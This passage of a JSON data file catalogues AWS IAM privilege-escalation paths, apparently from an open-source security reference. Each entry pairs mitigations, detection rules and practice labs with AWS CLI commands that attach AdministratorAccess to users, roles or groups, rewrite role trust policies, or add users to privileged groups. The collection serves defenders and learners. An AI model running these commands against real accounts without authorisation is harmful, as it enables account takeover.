    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:AttachUserPolicy` can attach managed policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
    "prerequisites": [
      "A managed IAM policy with elevated privileges must exist in the account",
      "Principal must be a user (not a role)"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam attach-user-policy --user-name @username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
          "description": "Attach the AdministratorAccess managed policy to the target user"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active (for self-escalation)"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:AttachUserPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-007",
      "iam-009",
      "iam-010"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L131",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L289-L298",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L103"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-attachuserpolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachUserPolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "iam_privesc_by_attachment",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS privilege escalation through policy attachment"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamattachuserpolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-user",
          "type": "principal",
          "description": "The IAM user with iam:AttachUserPolicy permission on themselves. Can attach any existing managed policy in the account to themselves, including AWS managed policies like AdministratorAccess.\n"
        },
        {
          "id": "managed_policy",
          "label": "managed-policy",
          "type": "resource",
          "description": "An existing IAM managed policy in the account. This could be an AWS managed policy (like AdministratorAccess, PowerUserAccess, etc.) or a customer managed policy with elevated permissions. The policy must already exist in the account.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "If an administrative managed policy exists (e.g., AdministratorAccess or equivalent custom policy), the user gains full administrative access to the account. The policy takes effect immediately after being attached.\n"
        },
        {
          "id": "some_perms",
          "label": "Some Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "If the attached managed policy has elevated but non-administrative permissions (e.g., PowerUserAccess, SecurityAudit, custom policies with specific permissions), the user gains those permissions. Check for data access paths or additional privilege escalation opportunities.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "If only minimal or restrictive managed policies exist in the account, there may be no meaningful privilege escalation achieved. The user would still gain the permissions from the attached policy, but they may not provide additional access beyond what the user already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "managed_policy",
          "label": "iam:AttachUserPolicy",
          "description": "Execute iam:AttachUserPolicy to attach an existing managed policy to the user. The attacker must identify a managed policy with elevated permissions to attach.\n\nCommand:\n```bash\naws iam attach-user-policy --user-name @username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe policy takes effect immediately after being attached. The user gains all permissions specified in the managed policy.\n"
        },
        {
          "from": "managed_policy",
          "to": "admin",
          "label": "If policy has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the attached managed policy is AdministratorAccess or an equivalent custom policy with administrative permissions, the user gains full administrative access to the AWS account. This is the most common and severe outcome.\n"
        },
        {
          "from": "managed_policy",
          "to": "some_perms",
          "label": "If policy has elevated permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the attached managed policy has elevated but non-administrative permissions, the user gains those specific permissions. Examples include PowerUserAccess (excludes IAM), ReadOnlyAccess, SecurityAudit, or custom policies with permissions to specific services. Check for data access or additional escalation paths.\n"
        },
        {
          "from": "managed_policy",
          "to": "no_access",
          "label": "If only minimal policies exist",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the account only has managed policies with minimal or restrictive permissions (e.g., policies that only grant read access to non-sensitive resources), the escalation may not provide meaningful additional access. However, this is rare since AWS managed policies like AdministratorAccess exist in all accounts.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachUserPolicy",
          "resourceConstraints": "Target user must be in the Resource section. For self-escalation, must have permission on own user."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-008.yaml"
  },
  {
    "id": "iam-009",
    "name": "iam:AttachRolePolicy",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:AttachRolePolicy` can attach managed policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.",
    "prerequisites": [
      "A managed IAM policy with elevated privileges must exist in the account",
      "Principal must be a role (not a user)"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam attach-role-policy --role-name @rolename --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
          "description": "Attach the AdministratorAccess managed policy to the target role"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active (for self-escalation)"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:AttachRolePolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-005",
      "iam-008",
      "iam-011"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L127",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L393-L467",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L99"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-attachrolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamattachrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-role",
          "type": "principal",
          "description": "The IAM role with iam:AttachRolePolicy permission on itself. The role can attach any managed policy to itself, including policies with full administrative access like AdministratorAccess.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The attached managed policy takes effect immediately. The starting role now has all permissions specified in the attached policy, including full administrative access if AdministratorAccess or an equivalent managed policy was attached.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "admin",
          "label": "iam:AttachRolePolicy",
          "description": "Execute iam:AttachRolePolicy to attach a managed policy with administrative permissions to the role itself. The policy takes effect immediately and grants the role any permissions specified in the managed policy.\n\nCommand:\n```bash\naws iam attach-role-policy --role-name @rolename --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe role immediately gains all permissions from the attached managed policy. Common targets include:\n- arn:aws:iam::aws:policy/AdministratorAccess (full admin access)\n- arn:aws:iam::aws:policy/IAMFullAccess (full IAM permissions)\n- Any custom managed policy with elevated permissions\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachRolePolicy",
          "resourceConstraints": "Target role must be in the Resource section. For self-escalation, must have permission on own role."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-009.yaml"
  },
  {
    "id": "iam-010",
    "name": "iam:AttachGroupPolicy",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:AttachGroupPolicy` can attach managed policies to any group they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges by attaching policies to a group they are a member of. A principal can also leverage this to escalate the permissions of other principals in the same group.",
    "prerequisites": [
      "Principal must be a user (not a role)",
      "Principal must be a member of the target group",
      "A managed IAM policy with elevated privileges must exist in the account"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam attach-group-policy --group-name @groupname --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
          "description": "Attach the AdministratorAccess managed policy to the group"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:AttachGroupPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-008",
      "iam-011"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L155",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L432",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L74"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-attachgrouppolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachGroupPolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/iamattachgrouppolicy-solution/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-user",
          "type": "principal",
          "description": "The IAM user initiating the attack. Must be a member of the target group and have iam:AttachGroupPolicy permission on that group. This attack path requires a user (not a role) because group membership only applies to IAM users.\n"
        },
        {
          "id": "target_group",
          "label": "Existing target-group",
          "type": "resource",
          "description": "The IAM group that the starting user is a member of. The user must have iam:AttachGroupPolicy permission on this specific group resource. Once an admin policy is attached to this group, all members of the group (including the attacker) inherit those permissions.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "After attaching an administrative managed policy (such as AdministratorAccess) to the group, the starting user immediately gains full administrative access to the AWS account. All group members inherit the attached policy's permissions.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_group",
          "label": "Member of group",
          "description": "The starting user must be a member of the target group. This is a prerequisite for the attack to work, as IAM permissions granted to groups are automatically inherited by all member users.\n"
        },
        {
          "from": "target_group",
          "to": "admin",
          "label": "iam:AttachGroupPolicy",
          "description": "Execute the iam:AttachGroupPolicy API call to attach an administrative managed policy to the group. The AdministratorAccess policy is the most common choice, but any managed policy with elevated privileges can be used.\n\nCommand:\n```bash\naws iam attach-group-policy \\\n  --group-name @groupname \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\nThe policy attachment takes effect immediately. All users in the group (including the attacker) now have the permissions granted by the attached policy. Verify with: `aws sts get-caller-identity` followed by testing an admin action.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachGroupPolicy",
          "resourceConstraints": "Target group must be in the Resource section. For self-escalation, must have permission on a group the principal belongs to."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-010.yaml"
  },
  {
    "id": "iam-011",
    "name": "iam:PutGroupPolicy",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:PutGroupPolicy` can attach inline policies to any group they have this permission on. This permission is often abused by one principal to grant additional permissions to themselves by attaching an inline policy to a group they are a member of.",
    "prerequisites": [
      "Principal must be a user (not a role)",
      "Principal must be a member of the target group"
    ],
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam put-group-policy --group-name @groupname --policy-name @policyname --policy-document file://escalation_policy.json",
          "description": "Attach an inline policy with elevated permissions to the group"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:PutGroupPolicy` using the principle of least privilege. Very few\nprincipals need this permission, so it should be restricted to only the few principals\nthat need it. Monitor use of this sensitive permission using CloudSIEM detections,\nand look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "relatedPaths": [
      "iam-005",
      "iam-007",
      "iam-010"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L136",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L1261",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L106"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-putgrouppolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-PutGroupPolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamputgrouppolicy-privesc/",
        "scenarioPricingModel": "free"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "starting-user",
          "type": "principal",
          "description": "The IAM user initiating the attack. Must be a member of a target group and have iam:PutGroupPolicy permission on that group. This attack only works for IAM users since roles cannot be members of groups.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "The inline policy is immediately applied to all members of the group, including the starting user. The user gains all permissions specified in the new inline policy, including full administrative access if that was included.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "admin",
          "label": "iam:PutGroupPolicy",
          "description": "Execute the iam:PutGroupPolicy API call to attach an inline policy with administrative permissions to a group that the starting user is a member of.\n\nExample command:\n```bash\naws iam put-group-policy \\\n  --group-name @groupname \\\n  --policy-name @policyname \\\n  --policy-document file://escalation_policy.json\n```\n\nThe inline policy is immediately applied to the group. All members of the group (including the attacker) now have the permissions specified in the new policy. The user can verify their new permissions with `aws sts get-caller-identity` or by attempting to use the new permissions.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:PutGroupPolicy",
          "resourceConstraints": "Target group must be in the Resource section. For self-escalation, must have permission on a group the principal belongs to."
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-011.yaml"
  },
  {
    "id": "iam-012",
    "name": "iam:UpdateAssumeRolePolicy",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "description": "Anyone with access to `iam:UpdateAssumeRolePolicy` can modify the trust policy of any role they have this permission on. This permission is often abused by one principal to modify a privileged role's trust policy to allow themselves to assume it, thereby gaining access to the privileged role's permissions.",
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam update-assume-role-policy --role-name @rolename --policy-document file://trust_policy.json",
          "description": "Update the role's trust policy to allow your principal to assume it"
        },
        {
          "step": 2,
          "command": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/@rolename --role-session-name exploit",
          "description": "Assume the privileged role"
        },
        {
          "step": 3,
          "command": "# Configure AWS CLI with the temporary credentials from assume-role",
          "description": "Use the elevated permissions of the assumed role"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:UpdateAssumeRolePolicy` using the principle of least privilege.\nVery few principals need this permission, so it should be restricted to only the few\nprincipals that need it. Monitor use of this sensitive permission using CloudSIEM\ndetections, and look for usage anomalies.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      }
    ],
    "detectionTools": {
      "pmapper": "https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/iam_edges.py#L130",
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L127",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L675",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L115"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "url": "https://docs.datadoghq.com/security/default_rules/7b6-2a8-df9/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-updateassumerolepolicy",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-UpdatingAssumeRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:UpdateAssumeRolePolicy permission on the target role. Can be an IAM user or role with permission to modify trust policies.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Role (Trust Policy to be Modified)",
          "type": "resource",
          "description": "The target IAM role whose trust policy will be modified. The attacker modifies this role's trust policy to allow themselves to assume it, thereby gaining access to all permissions attached to the role.\n"
        },
        {
          "id": "assumed_role",
          "label": "Target Role (assumed)",
          "type": "resource",
          "description": "The target role after being assumed by the attacker. The attacker now has temporary credentials with all the permissions of this role.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target role has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target role has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target role has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:UpdateAssumeRolePolicy",
          "description": "Execute iam:UpdateAssumeRolePolicy to modify the target role's trust policy to allow the starting principal to assume it. This adds the starting principal's ARN to the role's trust policy.\n\nCommand:\n```bash\naws iam update-assume-role-policy \\\n  --role-name @rolename \\\n  --policy-document file://trust_policy.json\n```\n\nThe trust_policy.json file should contain the starting principal's ARN in the Principal section.\n"
        },
        {
          "from": "target_role",
          "to": "assumed_role",
          "label": "sts:AssumeRole",
          "description": "After modifying the trust policy, assume the target role using sts:AssumeRole. This returns temporary credentials with all the permissions of the target role.\n\nCommand:\n```bash\naws sts assume-role \\\n  --role-arn arn:aws:iam::123456789012:role/@rolename \\\n  --role-session-name exploit\n```\n\nConfigure the AWS CLI with the temporary credentials from the assume-role response.\n"
        },
        {
          "from": "assumed_role",
          "to": "admin",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account.\n"
        },
        {
          "from": "assumed_role",
          "to": "some_perms",
          "label": "If role has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target role has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "assumed_role",
          "to": "no_access",
          "label": "If role has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target role only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:UpdateAssumeRolePolicy",
          "resourceConstraints": "Target role must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-012.yaml"
  },
  {
    "id": "iam-013",
    "name": "iam:AddUserToGroup",
    "category": "self-escalation",
    "services": [
      "iam"
    ],
    "description": "A principal with `iam:AddUserToGroup` can add any user to any group they have this permission on. By adding themselves to a group with elevated permissions, they can gain access to the policies attached to that group. The level of access gained depends on the permissions of the target group.",
    "prerequisites": {
      "admin": [
        "A group must exist with administrative permissions (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A group must exist with some level of permissions"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws iam add-user-to-group --user-name @username --group-name @privileged-group",
          "description": "Add the target user (or yourself) to a group with elevated permissions"
        },
        {
          "step": 2,
          "command": "aws sts get-caller-identity",
          "description": "Verify the new permissions are active"
        }
      ]
    },
    "recommendation": "Restrict access to `iam:AddUserToGroup` using the principle of least privilege. Only allow\nusers to add users to groups they are authorized to manage. Very few principals need this\npermission, so it should be restricted to only the few principals that need it.\n\nUse IAM policy conditions to restrict which groups users can be added to:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AddUserToGroup\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:group/SpecificGroup\"\n}\n```\n\nMonitor CloudTrail for unusual AddUserToGroup activity, especially adding users to\nprivileged groups.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS Privilege Escalation Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "IAM Vulnerable - AddUserToGroup",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "iam-008",
      "iam-010"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L119",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L488-L491",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L107"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-self-escalation/to-admin/iam-addusertogroup",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AddUserToGroup",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamaddusertogroup-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal with iam:AddUserToGroup permission on the target group. Can be an IAM user or role with permission to add users to groups with elevated permissions.\n"
        },
        {
          "id": "target_group",
          "label": "Existing target-group",
          "type": "resource",
          "description": "The target IAM group with elevated permissions. The attacker adds a user (themselves or another user) to this group to gain access to all policies attached to the group.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target group has AdministratorAccess or equivalent permissions attached.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The target group has some elevated permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The target group has no interesting permissions beyond what the starting principal already had.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_group",
          "label": "iam:AddUserToGroup",
          "description": "Execute iam:AddUserToGroup to add a user to the target group. The user immediately gains access to all policies attached to that group. You can add yourself (if you're a user) or add another user and then create access keys for them.\n\nCommand: `aws iam add-user-to-group --user-name @username --group-name @privileged-group`\n"
        },
        {
          "from": "target_group",
          "to": "admin",
          "label": "If group has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target group has AdministratorAccess or equivalent permissions attached, the attacker gains full administrative access to the account.\n"
        },
        {
          "from": "target_group",
          "to": "some_perms",
          "label": "If group has some permissions",
          "branch": "B",
          "condition": "some_permissions",
          "description": "If the target group has some elevated permissions, check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        },
        {
          "from": "target_group",
          "to": "no_access",
          "label": "If group has no interesting permissions",
          "branch": "C",
          "condition": "no_permissions",
          "description": "If the target group only has minimal permissions, there may be no meaningful privilege escalation achieved.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "iam:AddUserToGroup",
          "resourceConstraints": "Target group must be in the Resource section"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering target users"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for viewing user details"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
